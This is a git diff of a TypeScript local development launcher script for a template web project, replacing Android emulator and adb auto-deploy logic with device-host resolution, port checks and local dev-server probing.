@@ -1,9 +1,7 @@
 import { spawn, spawnSync } from 'node:child_process'
 import { lookup } from 'node:dns/promises'
-import { existsSync, readdirSync } from 'node:fs'
+import { createServer } from 'node:net'
 import { networkInterfaces } from 'node:os'
-import path from 'node:path'
-import { fileURLToPath } from 'node:url'
 import { templateBranding } from '../packages/template-config/src/index.ts'
 import {
   computeFingerprint,
@@ -11,184 +9,42 @@ import {
   getRunningServices,
   loadBuildCache,
   resolveComposeCommand,
+  root,
   runSync,
   saveBuildCache
 } from './compose-utils'
 import { generateFragmentCss } from './fragment-css'
 import { getRuntimeConfig } from './runtime-config'
 import {
+  buildSpacetimeModule,
   ensureSpacetimeJwtKeys,
+  hasBuiltSpacetimeModule,
   hasPublishedSpacetimeModule,
-  publishSpacetimeModule,
+  publishBuiltSpacetimeModule,
   waitForSpacetimeServer
 } from './spacetimedb'
 
-const root = fileURLToPath(new URL('..', import.meta.url))
-ensureSpacetimeJwtKeys()
+type BuildTarget = {
+  service: string
+  cacheKey: string
+  inputs: string[]
+  extra?: Record<string, string | undefined>
+}
 
 const isWsl = process.platform === 'linux' && Boolean(process.env.WSL_DISTRO_NAME || process.env.WSL_INTEROP)
-const runtimeConfig = getRuntimeConfig(process.env)
-const runtimeCompose = runtimeConfig.compose
-process.env.COMPOSE_PROJECT_NAME = process.env.COMPOSE_PROJECT_NAME?.trim() || runtimeCompose.projectName
+const falseyValues = new Set(['0', 'off', 'false', 'disabled', 'none'])
+const defaultP2pNostrRelays = 'wss://relay.damus.io,wss://nos.lol,wss://relay.snort.social'
 
-const resolveExistingPath = (value: string | undefined) => {
-  const raw = value?.trim().replace(/^["'](.*)["']$/, '$1')
-  if (!raw) return undefined
-
-  const normalizedWindows = raw.replace(/\\/g, '/')
-  const driveMatch = /^([a-zA-Z]):\/(.*)$/.exec(normalizedWindows)
-  const candidates = [raw]
-  if (isWsl && driveMatch) {
-    const [, drive, rest] = driveMatch
-    candidates.push(`/mnt/${drive.toLowerCase()}/${rest}`)
-  }
-
-  for (const candidate of candidates) {
-    if (existsSync(candidate)) return candidate
-  }
-  return undefined
+const resolveBunBin = () => {
+  const bunGlobal = globalThis as typeof globalThis & { Bun?: { execPath?: string } }
+  return (
+    (bunGlobal.Bun?.execPath && typeof bunGlobal.Bun.execPath === 'string' && bunGlobal.Bun.execPath) ||
+    (typeof process.execPath === 'string' && process.execPath) ||
+    'bun'
+  )
 }
 
-const resolveAndroidSdkHome = () => {
-  const explicit = resolveExistingPath(process.env.ANDROID_HOME?.trim() || process.env.ANDROID_SDK_ROOT?.trim())
-  if (explicit) return explicit
-  if (process.platform === 'win32' && process.env.LOCALAPPDATA?.trim()) {
-    const fallback = resolveExistingPath(path.join(process.env.LOCALAPPDATA, 'Android', 'Sdk'))
-    if (fallback) return fallback
-  }
-  if (process.platform === 'win32' && process.env.USERPROFILE?.trim()) {
-    const fallback = resolveExistingPath(path.join(process.env.USERPROFILE, 'AppData', 'Local', 'Android', 'Sdk'))
-    if (fallback) return fallback
-  }
-
-  if (isWsl) {
-    const users = [process.env.USERNAME?.trim(), process.env.USER?.trim()].filter((value): value is string => Boolean(value))
-    for (const user of users) {
-      const fallback = resolveExistingPath(path.join('/mnt', 'c', 'Users', user, 'AppData', 'Local', 'Android', 'Sdk'))
-      if (fallback) return fallback
-    }
-  }
-  return undefined
-}
-const androidSdkHome = resolveAndroidSdkHome()
-if (androidSdkHome && !process.env.ANDROID_HOME) process.env.ANDROID_HOME = androidSdkHome
-if (androidSdkHome && !process.env.ANDROID_SDK_ROOT) process.env.ANDROID_SDK_ROOT = androidSdkHome
-if (androidSdkHome) {
-  console.info(`[android] Using SDK: ${androidSdkHome}`)
-}
-
-const parseJavaMajor = (rawVersion: string) => {
-  const match = rawVersion.match(/version\s+"([^"]+)"/i)
-  if (!match) return undefined
-  const version = match[1].trim()
-  if (!version) return undefined
-
-  const [first = '', second = ''] = version.split('.')
-  const major =
-    first === '1' && second
-      ? Number.parseInt(second, 10)
-      : Number.parseInt(first.replace(/[^0-9].*$/, ''), 10)
-  if (!Number.isFinite(major)) return undefined
-  return major
-}
-
-const resolveJavaExe = (javaHome: string) =>
-  path.join(javaHome, 'bin', process.platform === 'win32' ? 'java.exe' : 'java')
-
-const resolveJavaMajorForHome = (javaHome: string) => {
-  const javaExe = resolveJavaExe(javaHome)
-  if (!existsSync(javaExe)) return undefined
-
-  const result = spawnSync(javaExe, ['-version'], { encoding: 'utf8' })
-  const output = `${result.stdout || ''}\n${result.stderr || ''}`
-  return parseJavaMajor(output)
-}
-
-const resolveJavaMajorFromPath = () => {
-  const result = spawnSync('java', ['-version'], { encoding: 'utf8' })
-  if (result.error || result.status !== 0) return undefined
-  const output = `${result.stdout || ''}\n${result.stderr || ''}`
-  return parseJavaMajor(output)
-}
-
-const collectChildDirs = (parent: string | undefined) => {
-  if (!parent) return []
-  const resolvedParent = resolveExistingPath(parent)
-  if (!resolvedParent) return []
-  try {
-    return readdirSync(resolvedParent, { withFileTypes: true })
-      .filter((entry) => entry.isDirectory())
-      .map((entry) => path.join(resolvedParent, entry.name))
-  } catch {
-    return []
-  }
-}
-
-const resolveSupportedAndroidJavaHome = () => {
-  const minJava = 17
-  const maxJava = 23
-  const isSupported = (major: number | undefined) => Number.isFinite(major) && major >= minJava && major <= maxJava
-
-  const explicit = resolveExistingPath(process.env.PROMETHEUS_ANDROID_JAVA_HOME?.trim())
-  if (explicit) {
-    const major = resolveJavaMajorForHome(explicit)
-    if (isSupported(major)) return { home: explicit, major: major as number, source: 'PROMETHEUS_ANDROID_JAVA_HOME' }
-    console.warn(
-      `[android] PROMETHEUS_ANDROID_JAVA_HOME points to Java ${major ?? 'unknown'}, but Android builds require Java ${minJava}-${maxJava}.`
-    )
-  }
-
-  const candidates = [
-    resolveExistingPath(process.env.JAVA_HOME?.trim()),
-    ...collectChildDirs(
-      process.platform === 'win32' && process.env.LOCALAPPDATA?.trim()
-        ? path.join(process.env.LOCALAPPDATA, 'mise', 'installs', 'java')
-        : undefined
-    ),
-    ...collectChildDirs(
-      process.platform === 'win32' && process.env.LOCALAPPDATA?.trim()
-        ? path.join(process.env.LOCALAPPDATA, 'Programs', 'Android Studio')
-        : undefined
-    ).map((dir) => path.join(dir, 'jbr')),
-    ...(process.platform === 'win32'
-      ? [
-          path.join(process.env.ProgramFiles || 'C:\\Program Files', 'Android', 'Android Studio', 'jbr'),
-          ...collectChildDirs(path.join(process.env.ProgramFiles || 'C:\\Program Files', 'Java')),
-          ...collectChildDirs(path.join(process.env.ProgramFiles || 'C:\\Program Files', 'Eclipse Adoptium')),
-          ...collectChildDirs(path.join(process.env.ProgramFiles || 'C:\\Program Files', 'Microsoft'))
-        ]
-      : [])
-  ]
-
-  const seen = new Set<string>()
-  const supported: Array<{ home: string; major: number }> = []
-  for (const candidate of candidates) {
-    if (!candidate) continue
-    const resolved = resolveExistingPath(candidate)
-    if (!resolved || seen.has(resolved)) continue
-    seen.add(resolved)
-
-    const major = resolveJavaMajorForHome(resolved)
-    if (isSupported(major)) {
-      supported.push({ home: resolved, major: major as number })
-    }
-  }
-
-  if (!supported.length) return undefined
-  supported.sort((a, b) => b.major - a.major)
-  return { ...supported[0], source: 'auto-detected' as const }
-}
-
-const resolveAndroidBinary = (binary: 'emulator' | 'adb') => {
-  const sdkHome = resolveAndroidSdkHome()
-  const fileName = process.platform === 'win32' ? `${binary}.exe` : binary
-  if (!sdkHome) return binary
-  const toolPath =
-    binary === 'emulator'
-      ? path.join(sdkHome, 'emulator', fileName)
-      : path.join(sdkHome, 'platform-tools', fileName)
-  return existsSync(toolPath) ? toolPath : binary
-}
+const bunBin = resolveBunBin()
 
 const isPrivateIpv4 = (value: string) => {
   if (value.startsWith('10.')) return true
@@ -215,7 +71,7 @@ const resolveWindowsIpv4 = () => {
   if (!isWsl) return undefined
   const script =
     "$ips = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -match '^(10\\.|192\\.168\\.|172\\.(1[6-9]|2\\d|3[0-1])\\.)' } | Select-Object -ExpandProperty IPAddress; " +
-    "if ($ips) { $ips }"
+    'if ($ips) { $ips }'
   const result = spawnSync('powershell.exe', ['-NoProfile', '-Command', script], { encoding: 'utf8' })
   if (result.status !== 0 || !result.stdout) return resolveWindowsIpv4FromIpconfig()
   const candidates = result.stdout
@@ -242,13 +98,114 @@ const resolveLocalIpv4 = () => {
   return preferred || candidates[0]
 }
 
+const requestedDeviceHost = process.env.PROMETHEUS_DEVICE_HOST?.trim()
 const resolveDeviceHost = () => {
-  const raw = process.env.PROMETHEUS_DEVICE_HOST?.trim()
-  if (!raw) return resolveWindowsIpv4() ?? resolveLocalIpv4()
-  const lowered = raw.toLowerCase()
-  if (['0', 'off', 'false', 'disabled', 'none'].includes(lowered)) return undefined
-  return raw
+  if (!requestedDeviceHost) return undefined
+  const normalized = requestedDeviceHost.toLowerCase()
+  if (falseyValues.has(normalized)) return undefined
+  if (normalized === 'auto') return resolveWindowsIpv4() ?? resolveLocalIpv4()
+  return requestedDeviceHost
 }
+
+const resolveOrigin = (host: string, port: string, protocol: 'http' | 'https') => {
+  const defaultPort = protocol === 'https' ? '443' : '80'
+  const portSuffix = port && port !== defaultPort ? `:${port}` : ''
+  return `${protocol}://${host}${portSuffix}`
+}
+
+const normalizeBasePort = (value: string) => {
+  try {
+    const url = new URL(value)
+    if (url.port) return url.port
+    if (url.protocol === 'https:') return '443'
+    if (url.protocol === 'http:') return '80'
+  } catch {
+    return null
+  }
+  return null
+}
+
+const resolveDeviceApiBase = (deviceHost: string | undefined, apiPort: string) => {
+  const trimmed = deviceHost?.trim()
+  if (!trimmed) return ''
+  const protocol = process.env.PROMETHEUS_DEVICE_PROTOCOL?.trim() || 'http'
+  const defaultPort = protocol === 'https' ? '443' : '80'
+  const portSuffix = apiPort && apiPort !== defaultPort ? `:${apiPort}` : ''
+
+  try {
+    const url = trimmed.startsWith('http://') || trimmed.startsWith('https://')
+      ? new URL(trimmed)
+      : new URL(`http://${trimmed}`)
+    url.protocol = `${protocol}:`
+    url.port = apiPort
+    url.pathname = ''
+    url.search = ''
+    url.hash = ''
+    return url.origin
+  } catch {
+    return `${protocol}://${trimmed}${portSuffix}`
+  }
+}
+
+const isLocalApiBase = (value: string) => {
+  if (!value) return true
+  if (value.startsWith('/')) return true
+  return value.includes('127.0.0.1') || value.includes('localhost')
+}
+
+const killChildTree = (pid: number | undefined, signal: NodeJS.Signals) => {
+  if (!pid) return
+  if (process.platform === 'win32') {
+    spawnSync('taskkill', ['/pid', `${pid}`, '/t', '/f'], { stdio: 'ignore', windowsHide: true })
+    return
+  }
+
+  try {
+    process.kill(pid, signal)
+  } catch {
+    // Ignore cleanup failures.
+  }
+}
+
+const probeHttpEndpoint = async (url: string, timeoutMs: number) => {
+  const controller = new AbortController()
+  const timeout = setTimeout(() => controller.abort(), timeoutMs)
+  try {
+    const response = await fetch(url, {
+      method: 'GET',
+      signal: controller.signal
+    })
+    return response.ok || response.status < 500
+  } catch {
+    return false
+  } finally {
+    clearTimeout(timeout)
+  }
+}
+
+const isPortAvailable = (port: number) =>
+  new Promise<boolean>((resolve) => {
+    const server = createServer()
+    server.unref()
+    server.once('error', () => {
+      resolve(false)
+    })
+    server.listen(port, () => {
+      server.close(() => resolve(true))
+    })
+  })
+
+const probeReusableSiteDevServer = async (port: string) => {
+  const candidates = [`http://127.0.0.1:${port}/`, `http://localhost:${port}/`]
+  for (const candidate of candidates) {
+    if (await probeHttpEndpoint(candidate, 1500)) return true
+  }
+  return false
+}
+
+ensureSpacetimeJwtKeys()
+generateFragmentCss()
+
 const resolvedDeviceHost = resolveDeviceHost()
 if (resolvedDeviceHost) {
   process.env.PROMETHEUS_DEVICE_HOST = resolvedDeviceHost
@@ -256,398 +213,11 @@ if (resolvedDeviceHost) {
   process.env.PROMETHEUS_DEVICE_HOST = ''
 }
 
-const truthyValues = new Set(['1', 'true', 'yes', 'on'])
-const falsyValues = new Set(['0', 'false', 'no', 'off', 'disabled'])
-const resolveBoolean = (value: string | undefined, fallback: boolean) => {
-  if (!value) return fallback
-  const normalized = value.trim().toLowerCase()
-  if (truthyValues.has(normalized)) return true
-  if (falsyValues.has(normalized)) return false
-  return fallback
-}
-
-const resolvePositiveInt = (value: string | undefined, fallback: string) => {
-  const parsed = Number.parseInt(value ?? '', 10)
-  if (!Number.isFinite(parsed) || parsed <= 0) return fallback
-  return `${parsed}`
-}
-const ensureDefault = (name: string, value: string) => {
-  const current = process.env[name]?.trim()
-  if (!current) process.env[name] = value
-}
-ensureDefault('PROMETHEUS_ANDROID_AUTODEPLOY', '1')
-ensureDefault('PROMETHEUS_ANDROID_AUTO_START_EMULATOR', '1')
-ensureDefault('PROMETHEUS_ANDROID_EMULATOR_MAX_PERFORMANCE', '1')
-ensureDefault('PROMETHEUS_ANDROID_EMULATOR_MEMORY_MB', '4096')
-ensureDefault('PROMETHEUS_ANDROID_EMULATOR_CORES', '4')
-ensureDefault('PROMETHEUS_ANDROID_EMULATOR_OPTIMIZE', '1')
-ensureDefault('PROMETHEUS_ANDROID_ANIMATION_SCALE', '1')
-ensureDefault('PROMETHEUS_ANDROID_EMULATOR_PIXEL_FRAME', '1')
-ensureDefault('PROMETHEUS_ANDROID_GRADLE_CONFIGURATION_CACHE', '1')
-
-const normalizeHost = (value?: string) => {
-  const trimmed = value?.trim()
-  if (!trimmed) return undefined
-  try {
-    const url =
-      trimmed.startsWith('http://') || trimmed.startsWith('https://') ? new URL(trimmed) : new URL(`http://${trimmed}`)
-    return url.hostname
-  } catch {
-    return trimmed
-  }
-}
-const parseArgList = (value: string | undefined) => {
-  const raw = value?.trim()
-  if (!raw) return []
-  const matches = raw.match(/[^\s"]+|"([^"]*)"/g)
-  if (!matches) return []
-  return matches.map((part) => part.replace(/^"(.*)"$/, '$1').replace(/^'(.*)'$/, '$1'))
-}
-const resolveEmulatorRefreshRate = () => {
-  const raw = process.env.PROMETHEUS_ANDROID_REFRESH_RATE?.trim() || process.env.PROMETHEUS_ANDROID_FPS?.trim()
-  if (!raw) return '120'
-  const parsed = Number.parseFloat(raw)
-  if (!Number.isFinite(parsed) || parsed <= 0) return '120'
-  return `${parsed}`
-}
-type AdbDeviceInfo = {
-  serial: string
-  state: string
-}
-
-const parseAdbDevices = (output: string) =>
-  output
-    .split(/\r?\n/)
-    .map((line) => line.trim())
-    .filter((line) => line && !line.startsWith('List of devices'))
-    .map((line) => line.split(/\s+/))
-    .filter((parts) => parts.length >= 2)
-    .map((parts) => ({ serial: parts[0], state: parts[1] }))
-
-const describeDevices = (devices: AdbDeviceInfo[]) =>
-  devices.length ? devices.map((device) => `${device.serial} (${device.state})`).join(', ') : 'none'
-
-const readyDevices = (devices: AdbDeviceInfo[]) => devices.filter((device) => device.state === 'device')
-const resolvePreferredEmulatorName = () =>
-  process.env.PROMETHEUS_ANDROID_EMULATOR_NAME?.trim() ||
-  process.env.PROMETHEUS_ANDROID_AVD?.trim() ||
-  process.env.ANDROID_AVD?.trim() ||
-  ''
-const resolvePreferredEmulator = (available: string[]) => {
-  const preferred = resolvePreferredEmulatorName()
-  if (preferred && available.includes(preferred)) return preferred
-
-  const pixel = available.find((avd) => /pixel/i.test(avd))
-  if (pixel) return pixel
-  return available[0]
-}
-const resolveAvailablePixelSkins = () => {
-  if (!androidSdkHome) return []
-  const skinsRoot = path.join(androidSdkHome, 'skins')
-  if (!existsSync(skinsRoot)) return []
-  try {
-    return readdirSync(skinsRoot, { withFileTypes: true })
-      .filter((entry) => entry.isDirectory())
-      .map((entry) => entry.name)
-      .filter((name) => /pixel/i.test(name))
-  } catch (error) {
-    return []
-  }
-}
-const resolveEmulatorSkin = (avd: string) => {
-  const explicit = process.env.PROMETHEUS_ANDROID_EMULATOR_SKIN?.trim()
-  if (explicit) return explicit
-
-  const enablePixelFrame = resolveBoolean(process.env.PROMETHEUS_ANDROID_EMULATOR_PIXEL_FRAME, true)
-  if (!enablePixelFrame) return undefined
-
-  if (/pixel/i.test(avd)) {
-    const directSkin = /pixel[-_]?\d+/i.test(avd) ? avd.toLowerCase().replace(/[^a-z0-9_]/g, '_') : 'pixel'
-    return directSkin
-  }
-
-  const skins = resolveAvailablePixelSkins()
-  if (skins.length > 1) {
-    const exactMatch = skins.find((name) => /_6|_7|_8|_9|pro/i.test(name))
-    if (exactMatch) return exactMatch
-    return skins[0]
-  }
-  if (skins.length === 1) return skins[0]
-
-  return undefined
-}
-const listEmulatorAvds = (emulatorBin: string) => {
-  const result = spawnSync(emulatorBin, ['-list-avds'], { encoding: 'utf8' })
-  if (result.error) {
-    if ((result.error as NodeJS.ErrnoException).code === 'ENOENT') {
-      console.warn('[android] Emulator binary not found while listing AVDs.')
-    } else {
-      console.warn('[android] Failed to list Android Virtual Devices.')
-    }
-    return []
-  }
-  if (result.status !== 0 || !result.stdout) {
-    console.warn('[android] Android Virtual Devices listing failed or returned no data.')
-    return []
-  }
-  return result.stdout
-    .split(/\r?\n/)
-    .map((line) => line.trim())
-    .filter((line) => line.length > 0)
-}
-let emulatorLaunchAttempted = false
-const launchAndroidEmulator = (): boolean => {
-  const autoStart = resolveBoolean(process.env.PROMETHEUS_ANDROID_AUTO_START_EMULATOR, true)
-  if (!autoStart || emulatorLaunchAttempted) return false
-
-  const emulatorBin = resolveAndroidBinary('emulator')
-  if (emulatorBin === 'emulator') {
-    console.warn('[android] Android emulator binary not found. Set ANDROID_HOME and include emulator in SDK tools.')
-    return false
-  }
-  const available = listEmulatorAvds(emulatorBin)
-  if (!available.length) {
-    console.warn('[android] No Android Virtual Devices found. Create one in Android Studio.')
-    return false
-  }
-
-  const preferred = resolvePreferredEmulatorName()
-  const avd = resolvePreferredEmulator(available)
-  emulatorLaunchAttempted = true
-  if (preferred && !available.includes(preferred)) {
-    console.warn(`[android] Requested emulator '${preferred}' was not found. Falling back to '${avd}'.`)
-  } else if (!preferred && /pixel/i.test(avd)) {
-    console.info('[android] No emulator name provided. Selected a Pixel AVD automatically for better fidelity/performance defaults.')
-  }
-
-  const memoryMb = resolvePositiveInt(process.env.PROMETHEUS_ANDROID_EMULATOR_MEMORY_MB?.trim(), '4096')
-  const cores = resolvePositiveInt(process.env.PROMETHEUS_ANDROID_EMULATOR_CORES?.trim(), '4')
-  const extraArgs = parseArgList(process.env.PROMETHEUS_ANDROID_EMULATOR_ARGS?.trim())
-  const enableMaxPerformance = resolveBoolean(process.env.PROMETHEUS_ANDROID_EMULATOR_MAX_PERFORMANCE, true)
-  const skin = resolveEmulatorSkin(avd)
-  const skinArgs = skin ? ['-skin', skin] : []
-  const baseArgs = enableMaxPerformance
-    ? [
-        '-no-snapshot-load',
-        '-no-snapshot',
-        '-no-boot-anim',
-        '-gpu',
-        'host',
-        '-memory',
-        memoryMb,
-        '-cores',
-        cores
-      ]
-    : ['-no-snapshot-load']
-  const refreshRate = resolveEmulatorRefreshRate()
-  const propArgs =
-    enableMaxPerformance && refreshRate ? ['-prop', `qemu.sf.lcd_refresh_rate=${refreshRate}`] : []
-  const args = ['-avd', avd, ...skinArgs, ...baseArgs, ...propArgs, ...extraArgs]
-
-  const toRun = (launchArgs: string[]) =>
-    `${emulatorBin} ${launchArgs.map((value) => (value.includes(' ') ? `"${value}"` : value)).join(' ')}`
-
-  const hasCustomExtra = extraArgs.length > 0
-  if (hasCustomExtra) {
-    console.info(`[android] Applying custom emulator args: ${extraArgs.join(' ')}`)
-  }
-  if (skin) {
-    console.info(`[android] Applying emulator skin: ${skin}`)
-  }
-
-  try {
-    const proc = spawn(emulatorBin, args, { detached: true, stdio: 'ignore', windowsHide: true })
-    proc.unref()
-    console.info(`[android] Starting emulator '${avd}' with: ${toRun(args)}`)
-    return true
-  } catch {
-    try {
-      const fallbackArgs = ['-avd', avd, '-no-snapshot-load']
-      const proc = spawn(emulatorBin, fallbackArgs, { detached: true, stdio: 'ignore', windowsHide: true })
-      proc.unref()
-      console.info(`[android] Starting emulator '${avd}' with fallback args: ${toRun(fallbackArgs)}`)
-      return true
-    } catch {
-      console.warn('[android] Failed to start Android emulator automatically.')
-      return false
-    }
-  }
-}
-const resolveAdbBinary = () => {
-  const override = resolveExistingPath(process.env.PROMETHEUS_ADB_PATH?.trim())
-  const adb = override || resolveAndroidBinary('adb')
-  if (!override && process.env.PROMETHEUS_ADB_PATH?.trim()) {
-    console.warn(`[android] PROMETHEUS_ADB_PATH was set but not found; using SDK adb at ${adb}.`)
-  }
-  return adb
-}
-
-const resolveAdbSerial = (
-  adbBin: string,
-  explicitSerial: string | undefined,
-  waitForDevice: boolean,
-  waitTimeoutMs: number
-) => {
-  const listDevices = () => spawnSync(adbBin, ['devices', '-l'], { encoding: 'utf8' })
-  const tryWait = () => {
-    if (!waitForDevice) return
-    const waitArgs = explicitSerial ? ['-s', explicitSerial, 'wait-for-device'] : ['wait-for-device']
-    const waited = spawnSync(adbBin, waitArgs, { timeout: waitTimeoutMs, stdio: 'inherit' })
-    if (waited.error && (waited.error as NodeJS.ErrnoException).code === 'ETIMEDOUT') {
-      console.warn('[android] Timed out waiting for a device.')
-    }
-  }
-
-  let result = listDevices()
-  if (result.error) {
-    if ((result.error as NodeJS.ErrnoException).code === 'ENOENT') {
-      console.warn('[android] adb not found; skipping Android auto-deploy.')
-    } else {
-      console.warn('[android] adb is unavailable; skipping Android auto-deploy.')
-    }
-    return undefined
-  }
-  if (result.status !== 0) {
-    console.warn('[android] adb devices failed; skipping Android auto-deploy.')
-    return undefined
-  }
-  let devices = parseAdbDevices(result.stdout || '')
-  if (!devices.length) {
-    if (launchAndroidEmulator()) {
-      tryWait()
-      result = listDevices()
-      if (result.status === 0) {
-        devices = parseAdbDevices(result.stdout || '')
-      }
-    }
-  }
-
-  if (explicitSerial) {
-    if (readyDevices(devices).find((device) => device.serial === explicitSerial)) return explicitSerial
-    const matching = devices.find((device) => device.serial === explicitSerial)
-    if (matching) {
-      console.warn(`[android] Requested device '${explicitSerial}' is ${matching.state}; waiting for it to become ready.`)
-    }
-    tryWait()
-    result = listDevices()
-    if (result.status === 0) {
-      devices = parseAdbDevices(result.stdout || '')
-      if (readyDevices(devices).find((device) => device.serial === explicitSerial)) return explicitSerial
-    }
-    console.warn('[android] Requested device not detected; skipping Android auto-deploy.')
-    return undefined
-  }
-
-  let ready = readyDevices(devices)
-  if (ready.length === 1) return ready[0].serial
-  if (devices.length === 0) {
-    tryWait()
-    result = listDevices()
-    if (result.status === 0) {
-      devices = parseAdbDevices(result.stdout || '')
-      ready = readyDevices(devices)
-      if (ready.length === 1) return ready[0].serial
-      if (ready.length > 1) {
-        console.warn(
-          `[android] Multiple ready devices detected after wait: ${describeDevices(ready)}. Set PROMETHEUS_ANDROID_SERIAL to pick one.`
-        )
-      }
-    }
-  }
-
-  if (devices.length > 1) {
-    const readyCount = ready.length
-    if (readyCount > 1) {
-      console.warn(`[android] Multiple devices detected: ${describeDevices(devices)}. Set PROMETHEUS_ANDROID_SERIAL to pick one.`)
-    } else if (readyCount === 1) {
-      return ready[0].serial
-    } else {
-      console.warn(`[android] No ready devices yet (states: ${describeDevices(devices)}). Waiting for boot may fix it.`)
-    }
-  } else {
-    if (devices.length === 1) {
-      console.warn(`[android] Device ${describeDevices(devices)} is not ready yet; skipping Android auto-deploy.`)
-    } else {
-      console.warn('[android] No device detected; skipping Android auto-deploy.')
-    }
-  }
-  return undefined
-}
-const runAdb = (adbBin: string, args: string[]) => {
-  const result = spawnSync(adbBin, args, { stdio: 'inherit' })
-  if (result.error) {
-    if ((result.error as NodeJS.ErrnoException).code === 'ENOENT') {
-      console.warn('[android] adb not found; skipping Android auto-deploy.')
-    } else {
-      console.warn('[android] adb failed to run; skipping Android auto-deploy.')
-    }
-    return false
-  }
-  if (result.status !== 0) {
-    console.warn(`[android] adb exited with ${result.status ?? 'unknown'}; skipping remaining steps.`)
-    return false
-  }
-  return true
-}
-const sleepSync = (ms: number) => {
-  Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, ms)
-}
-const waitForAndroidBoot = (adbBin: string, serial: string, timeoutMs: number) => {
-  const serialPrefix = ['-s', serial]
-  const deadline = Date.now() + Math.max(5000, timeoutMs)
-  while (Date.now() < deadline) {
-    const bootResult = spawnSync(adbBin, [...serialPrefix, 'shell', 'getprop', 'sys.boot_completed'], { encoding: 'utf8' })
-    const packageResult = spawnSync(adbBin, [...serialPrefix, 'shell', 'pm', 'path', 'android'], { encoding: 'utf8' })
-    const bootReady = bootResult.status === 0 && bootResult.stdout?.trim() === '1'
-    const packageReady =
-      packageResult.status === 0 && typeof packageResult.stdout === 'string' && packageResult.stdout.includes('package:')
-
-    if (bootReady && packageReady) return true
-    sleepSync(1000)
-  }
-  return false
-}
-const ensureAdbDeviceOnline = (adbBin: string, serial: string, timeoutMs: number) => {
-  const serialPrefix = ['-s', serial]
-  const deadline = Date.now() + Math.max(5000, timeoutMs)
-  while (Date.now() < deadline) {
-    spawnSync(adbBin, [...serialPrefix, 'wait-for-device'], { timeout: 5000 })
-    const state = spawnSync(adbBin, [...serialPrefix, 'get-state'], { encoding: 'utf8' })
-    if (state.status === 0 && state.stdout?.trim() === 'device') return true
-
-    spawnSync(adbBin, ['reconnect'], { encoding: 'utf8' })
-    sleepSync(1000)
-  }
-  return false
-}
-const optimizeAndroidDevice = (adbBin: string, serial: string) => {
-  const serialPrefix = ['-s', serial]
-  const enabled = resolveBoolean(process.env.PROMETHEUS_ANDROID_EMULATOR_OPTIMIZE, true)
-  if (!enabled) return
-
-  const refreshRate = resolveEmulatorRefreshRate()
-  if (refreshRate) {
-    const rateCmds = [
-      ['settings', 'put', 'system', 'min_refresh_rate', refreshRate],
-      ['settings', 'put', 'system', 'peak_refresh_rate', refreshRate]
-    ]
-    for (const cmd of rateCmds) {
-      runAdb(adbBin, [...serialPrefix, 'shell', ...cmd])
-    }
-  }
-
-  const animationScale = process.env.PROMETHEUS_ANDROID_ANIMATION_SCALE?.trim() || '1'
-  const animationCommands = [
-    ['settings', 'put', 'global', 'window_animation_scale', animationScale],
-    ['settings', 'put', 'global', 'transition_animation_scale', animationScale],
-    ['settings', 'put', 'global', 'animator_duration_scale', animationScale]
-  ]
-  for (const cmd of animationCommands) runAdb(adbBin, [...serialPrefix, 'shell', ...cmd])
-}
-
-
+const runtimeConfig = getRuntimeConfig(process.env)
+const runtimeCompose = runtimeConfig.compose
+const composeProfiles = Array.from(new Set(runtimeCompose.profiles))
 const { command, prefix } = resolveComposeCommand()
-generateFragmentCss()
+const cache = loadBuildCache()
 
 const devHttpPort = runtimeConfig.ports.http
 const devHttpsPort = runtimeConfig.ports.https
@@ -655,42 +225,39 @@ const devApiPort = runtimeConfig.ports.api
 const devSpacetimeDbPort = runtimeConfig.ports.spacetimedb
 const devGarnetPort = runtimeConfig.ports.garnet
 const devWebTransportPort = runtimeConfig.ports.webtransport
-const devProject = runtimeCompose.projectName
+const devSitePort = runtimeConfig.ports.deviceWeb
 const devWebHost = runtimeConfig.domains.web
 const devDbHost = runtimeConfig.domains.db
-const devDeviceHost = process.env.PROMETHEUS_DEVICE_HOST?.trim()
-const devDeviceWebPort = process.env.PROMETHEUS_DEVICE_WEB_PORT?.trim() || '4173'
-const useDeviceHost = Boolean(devDeviceHost)
+const useDeviceHost = Boolean(resolvedDeviceHost)
 const templateFeatures = runtimeConfig.template.features
 const realtimeEnabled = templateFeatures.realtime
 const analyticsEnabled = templateFeatures.analytics
 const pwaEnabled = templateFeatures.pwa
-const devEnablePrefetch = process.env.VITE_ENABLE_PREFETCH?.trim() || '1'
-const devEnableWebTransport =
-  process.env.VITE_ENABLE_WEBTRANSPORT_FRAGMENTS?.trim() ?? (realtimeEnabled && !useDeviceHost ? '1' : '0')
-const devEnableWebTransportDatagrams =
-  process.env.VITE_ENABLE_WEBTRANSPORT_DATAGRAMS?.trim() ?? (realtimeEnabled && !useDeviceHost ? '1' : '0')
-const devEnableCompression = process.env.VITE_ENABLE_FRAGMENT_COMPRESSION?.trim() || '1'
-const devEnableAnalytics = process.env.VITE_ENABLE_ANALYTICS?.trim() || (analyticsEnabled ? '1' : '0')
-const devEnableHighlight = process.env.VITE_ENABLE_HIGHLIGHT?.trim() || '0'
-const devHighlightProjectId = process.env.VITE_HIGHLIGHT_PROJECT_ID?.trim() || ''
-const devHighlightPrivacy = process.env.VITE_HIGHLIGHT_PRIVACY?.trim() || 'strict'
-const devHighlightSessionRecording = process.env.VITE_HIGHLIGHT_SESSION_RECORDING?.trim() || '1'
-const devHighlightCanvasSampling = process.env.VITE_HIGHLIGHT_CANVAS_SAMPLING?.trim() || ''
-const devHighlightSampleRate = process.env.VITE_HIGHLIGHT_SAMPLE_RATE?.trim() || ''
-const devEnableApiWebTransport = process.env.ENABLE_WEBTRANSPORT_FRAGMENTS?.trim() || (realtimeEnabled ? '1' : '0')
-const devEnableWebTransportDatagramsServer =
-  process.env.WEBTRANSPORT_ENABLE_DATAGRAMS?.trim() || (realtimeEnabled ? '1' : '0')
-const devWebTransportMaxDatagramSize = process.env.WEBTRANSPORT_MAX_DATAGRAM_SIZE?.trim() || '1200'
-const devDisableSw = process.env.VITE_DISABLE_SW?.trim() || (pwaEnabled ? '0' : '1')
-const isWindowsMount = root.startsWith('/mnt/')
-const enablePollingWatch = isWsl && isWindowsMount
-const includeRealtimeServices = runtimeCompose.includeOptionalServices
-const composeProfiles = Array.from(new Set(runtimeCompose.profiles))
 
-const composeEnv = {
+const devOrigin = resolveOrigin(devWebHost, devHttpsPort, 'https')
+const devDbOrigin = resolveOrigin(devDbHost, devHttpsPort, 'https')
+const explicitWebTransportBase = process.env.VITE_WEBTRANSPORT_BASE?.trim()
